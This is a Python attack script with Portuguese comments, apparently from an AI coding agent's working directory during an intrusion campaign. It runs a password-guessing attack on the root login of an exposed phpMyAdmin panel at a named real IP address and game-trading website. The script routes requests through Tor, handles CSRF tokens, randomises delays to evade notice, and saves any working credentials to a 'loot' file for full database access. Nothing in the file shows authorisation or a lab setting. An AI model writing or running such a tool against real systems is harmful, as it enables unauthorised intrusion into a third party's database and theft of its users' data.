#!/usr/bin/env python3
"""
PIVOT RODADA 2 — phpMyAdmin root cred stuffing com rockyou top 500.
phpMyAdmin 5.2.3 exposto (F-012), user root, sem WAF via bypass CF.
Fluxo: GET (cookie+token) -> POST login. Sucesso = redirect p/ index.php
ou body sem form login. Nao-destrutivo.
"""
import sys, time, random, requests, urllib3, re
from datetime import datetime
urllib3.disable_warnings()
PROXY={"https":"socks5://127.0.0.1:9050","http":"socks5://127.0.0.1:9050"}
BASE="https://186.226.60.54/phpMyAdmin/"
HOSTH="desapegogames.com.br"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"

def load_wordlist(path):
    with open(path,encoding="utf-8",errors="replace") as f:
        return [l.rstrip("\n") for l in f if l.strip()]

def get_token(sess):
    """GET /phpMyAdmin/ p/ obter cookie + token CSRF do form."""
    r=sess.get(BASE,headers={"Host":HOSTH,"User-Agent":UA},verify=False,timeout=30)
    m=re.search(r'name="token"\s+value="([^"]+)"',r.text)
    token=m.group(1) if m else ""
    set_sess=re.search(r'name="set_session"\s+value="([^"]+)"',r.text)
    ss=set_sess.group(1) if set_sess else ""
    return token, ss, r

def try_login(sess,user,pw):
    token,ss,_=get_token(sess)
    if not token:
        return None,"no_token"
    data={
        "set_session":ss,"pma_username":user,"pma_password":pw,
        "server":"1","token":token,
    }
    r=sess.post(BASE+"index.php",headers={"Host":HOSTH,"User-Agent":UA,
              "Content-Type":"application/x-www-form-urlencoded","Referer":BASE},
              data=data,verify=False,timeout=30,allow_redirects=False)
    return r,token

def main():
    wlp="/tmp/opencode/pivot/rockyou_top500.txt"
    passwords=load_wordlist(wlp)
    out="enum/pivot_pma_rockyou.log"
    f=open(out,"w")
    def log(m):
        ts=datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
        line=f"{ts} {m}"
        print(line,flush=True); f.write(line+"\n"); f.flush()
    log(f"[*] PIVOT phpMyAdmin root cred stuffing — rockyou top500 ({len(passwords)} senhas)")
    log(f"[*] Sucesso = redirect p/ index.php OU body sem form login")
    tried=0; hits=[]
    for pw in passwords:
        tried+=1
        sess=requests.Session(); sess.proxies.update(PROXY)
        try:
            r,token=try_login(sess,"root",pw)
            if r is None:
                log(f"  [{tried:04d}] root:{pw!r} -> no token (skip)")
                continue
            # sucesso: redirect 302 p/ index.php OU body sem form de login
            loc=r.headers.get("Location","")
            body=r.content
            form_login = b'name="pma_username"' in body or b'name="login_form"' in body
            access_denied = b"Access denied" in body or b"Cannot log in" in body
            success = (r.status_code in (301,302,303) and "index.php" in loc) or (r.status_code==200 and not form_login and not access_denied and b"phpMyAdmin" in body and b"navigation" in body.lower())
            if success:
                log(f"  [{tried:04d}] *** SUCCESS *** root:{pw!r} -> HTTP {r.status_code} loc={loc} form={form_login} denied={access_denied}")
                hits.append(("root",pw,r.status_code,loc))
            else:
                if tried%50==0:
                    log(f"  [{tried:04d}] root:{pw!r} -> FAIL HTTP {r.status_code} loc={loc} denied={access_denied}")
        except Exception as e:
            log(f"  [{tried:04d}] root:{pw!r} -> EXC {type(e).__name__}: {e}")
            time.sleep(5)
        time.sleep(random.uniform(2.0,3.0))
    log(f"\n=== RESULTADO PIVOT PMA ROCKYOU ===")
    log(f"Total tentativas: {tried}")
    log(f"Sucessos: {len(hits)}")
    for u,p,st,loc in hits:
        log(f"  HIT: {u!r}:{p!r} status={st} loc={loc}")
    if hits:
        log(f"\n[+] MySQL root cred obtida — DB TOTAL. SELECT VERSION(), SHOW DATABASES.")
        with open("loot/pma_creds_rockyou.txt","w") as lf:
            for u,p,st,loc in hits:
                lf.write(f"{u}:{p}\n")
    else:
        log(f"[-] Nenhuma cred root com rockyou top500.")
    f.close()
    return hits

if __name__=="__main__":
    main()
